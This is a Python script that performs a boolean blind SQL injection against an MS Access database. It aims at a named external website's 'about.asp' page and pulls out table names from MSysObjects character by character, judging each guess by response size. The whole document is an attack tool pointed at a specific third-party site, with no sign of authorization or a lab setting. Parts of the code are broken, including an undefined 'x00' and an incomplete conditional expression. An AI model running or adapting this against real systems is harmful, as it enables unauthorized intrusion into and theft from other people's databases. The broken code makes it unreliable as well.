import requests
import sys
import re
import hashlib

URL = "http://gdrongda.com/cn/about.asp"
TRUE_SIZE = 96
FALSE_SIZE = 26629
THRESHOLD = 5000  # if response < THRESHOLD, it's TRUE

def is_true(payload):
    """Test if a boolean condition is TRUE (small response) or FALSE (large response)"""
    full_url = f"{URL}?id=1 AND {payload}"
    try:
        r = requests.get(full_url, timeout=15)
        return len(r.content) < THRESHOLD
    except Exception as e:
        print(f"  [!] Request error: {e}")
        return None

def extract_char_single(query_template, pos, charset=None):
    """Binary search for a single character using MID"""
    if charset is None:
        # Full printable ASCII range
        charset = list(range(32, 127))
    
    lo, hi = 0, len(charset) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        ch = charset[mid]
        payload = query_template.format(pos=pos, ch=ch)
        if is_true(payload):
            return chr(ch)
        # Test if target char is greater than current
        payload_gt = query_template.format(pos=pos, ch=ch).replace("=", ">")
        if is_true(payload_gt):
            lo = mid + 1
        else:
            hi = mid - 1
    return None

def extract_string(query_template, max_len=50):
    """Extract a string character by character"""
    result = ""
    for pos in range(1, max_len + 1):
        # First check if position exists (not null/empty)
        check_payload = query_template.replace("ASC(MID(", "LEN(").split(")")[0] + f") >= {pos}"
        # Alternative: just try extracting
        ch = extract_char_single(query_template, pos)
        if ch is None or ch == x00:
            break
        result += ch
        sys.stdout.write(ch)
        sys.stdout.flush()
    return result

def extract_len(query_template):
    """Extract length of a string using binary search"""
    lo, hi = 1, 100
    while lo < hi:
        mid = (lo + hi) // 2
        payload = query_template.format(length=mid, op=">=")
        if is_true(payload):
            lo = mid + 1
        else:
            hi = mid
    # Verify
    if not is_true(query_template.format(length=lo, op="=")):
        lo -= 1
    return lo

def get_table_names():
    """Extract table names from MSysObjects"""
    print("[*] Extracting table names from MSysObjects...")
    tables = []
    
    # First, count how many tables
    count = 0
    for i in range(1, 50):
        payload = f"(SELECT COUNT(*) FROM MSysObjects WHERE Type=1 AND Flags=0)={i}"
        if is_true(payload):
            count = i
            break
    print(f"[+] Found {count} user table(s)")
    
    for t_idx in range(1, count + 1):
        print(f"\n[*] Table #{t_idx}:")
        # Get length first
        len_template = "ASC(MID((SELECT TOP 1 Name FROM (SELECT TOP {t_idx} Name FROM MSysObjects WHERE Type=1 AND Flags=0 ORDER BY 1) t ORDER BY 1 DESC),1))>0 AND LEN((SELECT TOP 1 Name FROM (SELECT TOP {t_idx} Name FROM MSysObjects WHERE Type=1 AND Flags=0 ORDER BY 1) t ORDER BY 1 DESC)){op}{length}"
        
        # Simpler approach: extract char by char with binary search
        name = ""
        for pos in range(1, 50):
            found = False
            lo, hi = 32, 126
            while lo <= hi:
                mid = (lo + hi) // 2
                payload = f"ASC(MID((SELECT TOP 1 Name FROM (SELECT TOP {t_idx} Name FROM MSysObjects WHERE Type=1 AND Flags=0 ORDER BY 1) t ORDER BY 1 DESC),{pos}))>={mid}"
                if is_true(payload):
                    found = True
                    result_ch = mid
                    lo = mid + 1
                else:
                    hi = mid - 1
            
            if found:
                ch = chr(result_ch) if result_ch else 
                if 32 <= result_ch <= 126:
                    name += chr(result_ch)
                    sys.stdout.write(chr(result_ch))
                    sys.stdout.flush()
                else:
                    break
            else:
                break
        
        print(f"\n  -> Table name: {name}")
        tables.append(name)
    
    return tables

print("[*] Starting MS Access boolean blind SQL injection")
print(f"[*] Target: {URL}")
print(f"[*] TRUE threshold: < {THRESHOLD} bytes")
print()

tables = get_table_names()
print(f"\n[+] All tables: {tables}")
